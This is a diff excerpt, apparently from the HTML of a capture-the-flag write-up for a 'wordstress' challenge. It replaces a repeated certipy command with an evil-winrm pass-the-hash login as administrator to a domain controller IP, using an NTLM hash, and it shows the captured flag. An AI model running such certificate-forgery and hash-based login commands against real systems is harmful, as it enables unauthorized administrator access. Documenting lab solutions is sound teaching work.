@@ -111,7 +111,7 @@ ctf team, barely got some sleep. They really did a good job considering it&amp;r
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q certipy auth -pfx administrator_dc.pfx -dc-ip 94.72.112.254
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_28.png" class="center" style="border-radius: 8px;" />
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q certipy auth -pfx administrator_dc.pfx -dc-ip 94.72.112.254
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q evil-winrm -i 94.72.112.254 -u administrator -H d8dabcadf488114f7c5a46604fb26235
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_29.png" class="center" style="border-radius: 8px;" />
 &lt;p>Flag: &lt;code>r00t{C3rtificate_f0r_grandline_wh4t_a_j0ke_I_can_for9e}&lt;/code>&lt;/p>
